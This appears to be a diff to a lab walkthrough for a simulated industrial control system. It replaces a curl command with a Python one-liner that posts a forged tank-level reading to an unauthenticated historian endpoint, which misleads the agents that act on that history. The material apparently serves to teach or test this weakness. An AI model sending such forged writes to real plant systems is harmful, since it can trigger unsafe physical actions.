@@ -5,9 +5,12 @@
 1. The historian's write path is unauthenticated. Forge a sensor reading:
 
    ```bash
-   curl -s -X POST http://historian:8000/inject \
-     -H "Content-Type: application/json" \
-     -d '{"tag":"tank_level_pct","value":1.0}'
+   # from a shell on the lab network (here: the HMI container, which has Python but no curl)
+   docker compose exec hmi python -c "
+   import json, urllib.request as u
+   req = u.Request('http://historian:8000/inject', data=json.dumps({'tag': 'tank_level_pct', 'value': 1.0}).encode(),
+                   headers={'Content-Type': 'application/json'})
+   print(u.urlopen(req).read().decode())"
    ```
 
 2. Both agents read history to decide what to do. The forged low level makes them react: the
